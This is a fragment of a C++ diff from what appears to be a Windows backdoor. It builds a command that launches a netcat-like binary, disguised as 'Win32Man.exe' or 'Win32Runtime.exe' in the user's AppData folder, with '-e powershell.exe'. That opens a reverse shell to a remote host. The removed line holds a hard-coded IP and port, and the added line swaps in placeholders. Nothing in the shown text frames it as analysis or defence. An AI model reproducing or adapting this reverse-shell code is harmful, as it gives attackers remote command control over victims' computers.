@@ -16,7 +16,7 @@ int main()
 
   std::string ncCommand = "C:\\Users\\";
 	ncCommand += username;
-	ncCommand += "\\AppData\\Local\\Win32Man.exe 49.187.85.189 444 -e powershell.exe";
+	ncCommand += "\\AppData\\Local\\Win32Runtime.exe [attacker-IP] [port] -e powershell.exe";
 
   STARTUPINFO info={sizeof(info)};
   PROCESS_INFORMATION processInfo;
